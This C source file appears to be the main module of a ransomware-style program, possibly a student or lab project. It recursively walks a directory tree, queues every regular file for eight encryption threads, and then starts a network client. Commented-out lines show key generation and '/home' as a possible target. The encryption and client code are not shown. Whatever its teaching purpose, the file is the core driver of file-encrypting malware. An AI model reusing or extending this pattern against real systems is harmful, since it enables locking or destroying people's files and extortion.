#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/stat.h>
#include <errno.h>

#include "../../headers/encryption.h"
#include "../../headers/thread.h"
#include "../../headers/globals.h"
#include "../../headers/client.h"

const int THREADS_NUMBER = 8;

void traverse(const char *path) {

    struct dirent *entry;
    DIR *dir = opendir(path);

    if (!dir) {
        perror("opendir");
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        // Skip current and parent directory
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        char fullPath[1024];
        if (snprintf(fullPath, sizeof(fullPath), "%s/%s", path, entry->d_name) >= sizeof(fullPath)) {
            fprintf(stderr, "Path too long: %s/%s\n", path, entry->d_name);
            continue;
        }

        // snprintf(fullPath, sizeof(fullPath), "%s/%s", path, entry->d_name);

        struct stat statbuf;
        if (stat(fullPath, &statbuf) == -1) {
            perror("stat");
            continue;
        }

        // skip links to avoid potential loops
        if (S_ISLNK(statbuf.st_mode)) {
            continue;
        }

        if (S_ISDIR(statbuf.st_mode)) {
            printf("Directory: %s\n", fullPath);
            traverse(fullPath);  // recursive call
        } else if (S_ISREG(statbuf.st_mode)) {
            printf("File: %s\n", fullPath);
            enqueue(&queue, fullPath);
        }
    }

    closedir(dir);
}

int main() {
    //const char *start_path = "/home/nicolas-berger/Documents/Safe/test_encryption";
    const char *start_path = "/home/drikson/Documents/os/test";
    //const char *start_path = "/home/vboxuser/test";
    // const char *start_path = "/home/simon/Desktop/test";
    //const char *start_path = "/home";

    if (start_path == NULL) {
        fprintf(stderr, "Home directory not found.\n");
        return EXIT_FAILURE;
    }

    struct stat st;
    if (stat(start_path, &st) == -1) {
        fprintf(stderr, "stat failed on %s: %s\n", start_path, strerror(errno));
        return EXIT_FAILURE;
    }

    if (!S_ISDIR(st.st_mode)) {
        fprintf(stderr, "%s is not a directory\n", start_path);
        return EXIT_FAILURE;
    }

    //RAND_bytes(key, sizeof(key));
    initializeQueue(&queue);

    traverse(start_path);

    startclient();

    return 0; 
}
